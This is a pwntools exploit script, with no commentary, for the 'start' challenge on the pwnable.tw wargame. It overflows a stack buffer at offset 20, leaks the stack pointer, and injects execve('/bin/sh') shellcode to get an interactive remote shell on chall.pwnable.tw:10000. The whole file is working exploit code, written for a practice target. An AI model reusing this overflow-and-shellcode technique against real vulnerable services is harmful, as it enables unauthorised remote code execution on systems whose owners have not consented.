#!/usr/bin/env python

from pwn import *

context.update(log_level='info', arch='i386', os='linux')

#p = process('./start')
p = remote('chall.pwnable.tw', 10000)

ret = 0x08048087
cyclic_offset = 20

p.sendafter(':', (fit({
    cyclic_offset: p32(ret)
    })))

esp = u32(p.recv(1024)[:4])
log.success('esp: ' + hex(esp))

p.send(fit({
    cyclic_offset: [p32(esp + 20), asm(shellcraft.execve('/bin/sh'))]
    }))

p.interactive()
